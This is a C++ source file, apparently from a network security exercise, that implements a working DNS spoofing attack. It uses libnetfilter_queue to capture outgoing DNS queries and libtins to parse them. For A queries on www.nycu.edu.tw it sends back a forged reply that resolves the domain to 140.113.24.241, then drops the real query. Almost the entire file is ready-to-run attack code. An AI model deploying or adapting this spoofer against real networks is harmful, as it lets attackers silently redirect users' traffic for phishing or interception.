#include <iostream>
#include <tins/tins.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <linux/netfilter.h>
#include <cstring>

using namespace std;
using namespace Tins;

const string target_domain = "www.nycu.edu.tw";
const IPv4Address spoofed_ip("140.113.24.241");
PacketSender sender;

int packet_callback(struct nfq_q_handle* qh, struct nfgenmsg* nfmsg,
                    struct nfq_data* nfa, void* data) {
    unsigned char* payload = nullptr;
    int len = nfq_get_payload(nfa, &payload);

    if (len >= 0 && payload) {
        try {
            IP ip((const uint8_t*)payload, len);

            if (!ip.find_pdu<UDP>()) return nfq_set_verdict(qh, nfq_get_msg_packet_hdr(nfa)->packet_id, NF_ACCEPT, 0, nullptr);
            const UDP& udp = ip.rfind_pdu<UDP>();

            if (udp.dport() != 53) return nfq_set_verdict(qh, nfq_get_msg_packet_hdr(nfa)->packet_id, NF_ACCEPT, 0, nullptr);

            const RawPDU* raw = udp.find_pdu<RawPDU>();
            if (!raw) {
                cerr << "[-] No RawPDU found\n";
                return nfq_set_verdict(qh, nfq_get_msg_packet_hdr(nfa)->packet_id, NF_ACCEPT, 0, nullptr);
            }

            DNS dns;
            try {
                dns = DNS(raw->payload().data(), raw->payload().size());
            } catch (const std::exception& e) {
                cerr << "[-] DNS parse error: " << e.what() << endl;
                return nfq_set_verdict(qh, nfq_get_msg_packet_hdr(nfa)->packet_id, NF_ACCEPT, 0, nullptr);
            }

            if (dns.type() == DNS::QUERY) {
                for (const auto& query : dns.queries()) {
                    if (query.query_type() == DNS::A && query.dname() == target_domain) {
                        cout << "[*] DNS query for " << query.dname() << endl;

                        DNS spoofed_dns;
                        spoofed_dns.id(dns.id());
                        spoofed_dns.type(DNS::RESPONSE);
                        spoofed_dns.recursion_desired(dns.recursion_desired());
                        spoofed_dns.recursion_available(true);
                        spoofed_dns.add_query(query);
                        spoofed_dns.add_answer(DNS::resource(
                            query.dname(),
                            spoofed_ip.to_string(),  // Convert to string
                            DNS::A,
                            query.query_class(),
                            300
                        ));

                        IP response_ip(ip.dst_addr(), ip.src_addr());
                        UDP response_udp(53, udp.sport());

                        auto packet = response_ip / response_udp / spoofed_dns;
                        sender.send(packet);

                        cout << "[+] Spoofed response sent to " << ip.src_addr() << endl;

                        return nfq_set_verdict(qh, nfq_get_msg_packet_hdr(nfa)->packet_id, NF_DROP, 0, nullptr);
                    }
                }
            }

        } catch (const std::exception& e) {
            cerr << "[-] Exception: " << e.what() << endl;
        }
    }

    // Default: accept the packet
    return nfq_set_verdict(qh, nfq_get_msg_packet_hdr(nfa)->packet_id, NF_ACCEPT, 0, nullptr);
}

int main() {
    struct nfq_handle* h = nfq_open();
    struct nfq_q_handle* qh = nfq_create_queue(h, 0, &packet_callback, nullptr);
    nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff);

    char buf[4096] __attribute__((aligned));
    while (true) {
        int len = recv(nfq_fd(h), buf, sizeof(buf), 0);
        if (len >= 0) nfq_handle_packet(h, buf, len);
    }

    nfq_destroy_queue(qh);
    nfq_close(h);
    return 0;
}
